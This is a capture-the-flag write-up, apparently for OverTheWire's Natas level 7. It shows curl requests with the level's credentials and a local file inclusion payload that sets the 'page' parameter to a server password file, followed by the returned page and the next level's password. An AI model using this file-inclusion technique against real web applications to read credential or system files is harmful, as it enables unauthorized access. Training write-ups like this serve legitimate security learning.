---
title: "Natas 7 - Local file inclusion"
date: 2026-04-06T13:40:03-05:00
draft: false
aliases:
  - /posts/natas/natas-7/

toc: false
images:
tags:
  - security
  - natas
  - overthewire
  - curl
---

- **Username:** `natas7`
- **Password:** `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`
- **URL:** <http://natas7.natas.labs.overthewire.org>

```bash
curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS http://natas7.natas.labs.overthewire.org
```

Body:

```html
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
```

This one is straightforward once you notice the `page` parameter in the links.
`index.php?page=home` can be modified by replacing `home` with `/etc/natas_webpass/natas8`.

```bash
curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

Body:

```html
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
```

That gives the password by manipulating the PHP URL parameter to read an accessible local file (LFI).

**Password for natas8:** `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`
